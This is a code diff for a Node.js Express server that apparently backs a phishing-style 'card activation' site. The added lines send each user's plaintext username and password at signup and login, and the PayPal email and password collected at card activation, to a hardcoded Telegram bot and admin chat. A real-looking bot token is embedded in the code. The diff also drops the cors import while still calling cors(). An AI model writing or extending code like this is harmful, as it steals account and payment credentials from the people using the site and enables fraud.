@@ -1,34 +1,37 @@
 const express = require('express');
 const jwt = require('jsonwebtoken');
 const fs = require('fs');
+const fetch = require('node-fetch');
 const app = express();
 const port = process.env.PORT || 3000;
 
 // Enable CORS for frontend
-const cors = require('cors');
-app.use(cors({ origin: 'http://localhost:5500' })); // Adjust origin for your frontend
-
+app.use(cors({ origin: 'http://localhost:5500' })); // Adjust for your frontend
 app.use(express.json());
 
-// Data file initialization with error handling
+// Data file initialization
 const dataFile = 'data.json';
 let data = { users: [], cards: [], logs: [] };
 try {
     if (fs.existsSync(dataFile)) {
         data = JSON.parse(fs.readFileSync(dataFile));
+    } else {
+        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
     }
 } catch (error) {
-    console.error('Failed to load data.json:', error);
-    data = { users: [], cards: [], logs: [] };
+    console.error('Error loading data.json:', error);
     fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
 }
+
+// Telegram credentials
+const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
+const TELEGRAM_CHAT_ID_ADMIN = '6270110371';
 
 // Middleware to verify token
 const authenticateToken = (req, res, next) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'No token provided' });
-
     jwt.verify(token, 'your-secret-key', (err, user) => {
         if (err) return res.status(403).json({ error: 'Invalid token' });
         req.user = user;
@@ -36,8 +39,30 @@ const authenticateToken = (req, res, next) => {
     });
 };
 
+// Telegram notification function
+async function sendTelegramNotification(message) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
+        });
+        if (response.ok) {
+            console.log('Telegram notification sent:', message);
+            return true;
+        } else {
+            const errorText = await response.text();
+            console.error('Telegram API error:', errorText);
+            return false;
+        }
+    } catch (error) {
+        console.error('Telegram notification error:', error);
+        return false;
+    }
+}
+
 // Authentication routes
-app.post('/api/auth/signup', (req, res) => {
+app.post('/api/auth/signup', async (req, res) => {
     try {
         const { username, password } = req.body;
         if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
@@ -48,6 +73,8 @@ app.post('/api/auth/signup', (req, res) => {
         }
         data.users.push({ username, password });
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+        const message = `New signup: Username: ${username}, Password: ${password}`;
+        await sendTelegramNotification(message);
         res.status(201).json({ message: 'User created successfully' });
     } catch (error) {
         console.error('Signup error:', error);
@@ -55,12 +82,14 @@ app.post('/api/auth/signup', (req, res) => {
     }
 });
 
-app.post('/api/auth/login', (req, res) => {
+app.post('/api/auth/login', async (req, res) => {
     try {
         const { username, password } = req.body;
         const user = data.users.find(u => u.username === username && u.password === password);
         if (!user) return res.status(401).json({ error: 'Invalid credentials' });
         const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
+        const message = `Login: Username: ${username}, Password: ${password}`;
+        await sendTelegramNotification(message);
         res.json({ token });
     } catch (error) {
         console.error('Login error:', error);
@@ -125,23 +154,17 @@ app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
 app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
     try {
         const cardId = req.params.cardId;
-        const { username, password } = req.body;
+        const { username: paypalUsername, password: paypalPassword } = req.body;
         const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
         if (!card) return res.status(404).json({ error: 'Card not found' });
-        if (!username || !password) return res.status(400).json({ error: 'PayPal credentials required' });
+        if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
         card.status = 'activated';
-        card.paypalUsername = username;
-        card.paypalPassword = password;
+        card.paypalUsername = paypalUsername;
+        card.paypalPassword = paypalPassword;
         data.logs.push({ user: req.user.username, time: Date.now() });
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-
-        // Telegram notification
-        const message = `Card ${cardId} activated by ${req.user.username} with PayPal: ${username}`;
+        const message = `Card ${cardId} activated by ${req.user.username} with PayPal: Email: ${paypalUsername}, Password: ${paypalPassword}`;
         const telegramSuccess = await sendTelegramNotification(message);
-        if (!telegramSuccess) {
-            console.warn('Telegram notification failed, but activation succeeded');
-        }
-
         res.json({ message: 'Card activated', cardId, telegramNotification: telegramSuccess });
     } catch (error) {
         console.error('Activate card error:', error);
@@ -168,41 +191,12 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     }
 });
 
-// Telegram notification function with provided credentials
-const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo'; // Your provided token
-const TELEGRAM_CHAT_ID_ADMIN = '6270110371'; // Your provided chat ID
-async function sendTelegramNotification(message) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID_ADMIN) {
-        console.log('Telegram notification skipped: Missing token or chat ID');
-        return false;
-    }
-    try {
-        const fetch = require('node-fetch');
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
-        });
-        if (response.ok) {
-            console.log('Telegram notification sent:', message);
-            return true;
-        } else {
-            console.error('Telegram API error:', await response.text());
-            return false;
-        }
-    } catch (error) {
-        console.error('Telegram notification error:', error);
-        return false;
-    }
-}
-
-// Global error handler
+// Error handlers
 app.use((err, req, res, next) => {
     console.error('Global error:', err.stack);
     res.status(500).json({ error: 'Internal server error' });
 });
 
-// Custom 404 handler (place after all routes)
 app.use((req, res) => {
     res.status(404).json({ error: 'Route not found' });
 });
@@ -211,7 +205,6 @@ app.listen(port, () => {
     console.log(`Server running on port ${port}`);
 });
 
-// Save data on process exit
 process.on('SIGTERM', () => {
     fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
     process.exit(0);
